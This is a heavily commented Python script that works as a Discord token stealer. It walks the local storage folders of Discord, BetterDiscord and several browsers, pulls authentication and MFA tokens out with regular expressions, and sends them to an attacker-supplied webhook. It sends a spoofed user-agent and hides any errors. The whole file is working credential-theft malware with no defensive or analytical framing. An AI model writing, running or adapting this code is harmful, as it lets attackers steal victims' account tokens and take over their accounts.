import os, re, json
from urllib.request import Request, urlopen

WEBHOOK_URL = 'WEBHOOK LINK' #Make a webhook here. Refer to this 'https://www.youtube.com/watch?v=fKksxz2Gdnc' for creating a webhook

PING_ME = True #If true then it will ping @everyone

def get_tokens(path): #Searching for token
    path += '\\Local Storage\\leveldb' #Main folder which contains the file which contains the tokens (this gets incremented to the given paths in the main() function)

    tokens = [] #Empty array which will store token later

    for file in os.listdir(path): #Searching the file here
        if not file.endswith('.log') and not file.endswith('.ldb'): #Setting conditions on what type of files to find
            continue
        for line in [x.strip() for x in open(f'{path}\\{file}', errors='ignore').readlines() if x.strip()]: #Searching the token in the files which we found from above
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'): #Setting conditions on what words to look out for in the files
                for token in re.findall(regex, line): #Starting to searching the word
                    tokens.append(token) #Adding the found words/tokens in the empty tokens array
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA') #This is 'C:\Users\<User Name>\AppData\Local'
    roaming = os.getenv('APPDATA') #This is 'C:\Users\<User Name>\AppData\Roaming'

    paths = { #Setting paths for various versions of discord
        'Discord': roaming + '\\Discord',
        'BetterDiscord': roaming + '\\BetterDiscord Installer',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Microsoft Edge' : local + 'Microsoft\\Edge\\User Data\\Default',
        'Opera GX' : roaming + '\\Opera Software\\Opera GX Stable'
    }

    message = '@everyone'if PING_ME else '' #Function which will add @everyone to the message

    for platform, path in paths.items(): #Looking for paths and versions of discord available in the machine
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n' #Creating an embeded message
        tokens = get_tokens(path) #Getting the token according to the version of discord
        if len(tokens)>0: #Condition for adding the token in the message
            for token in tokens: 
                message += f'{token}\n' #Adding the token number in the message
        else:
            message += 'No tokens found\n'
        message += '```' #Closing the message

    headers = { #Creating headers for http requests
        'Content-Type': 'application/json', #Since we are transferring data thus we need to use json file types for transferring
        'User-Agent': ' Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246 ' #Creating a fake user-agent
    }

    payload = json.dumps({'content': message})

    try: #Connecting to your webhook
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers) 
        urlopen(req)
    except:
        pass

if __name__ == '__main__': #Beginning the code
    main() #Calling the main function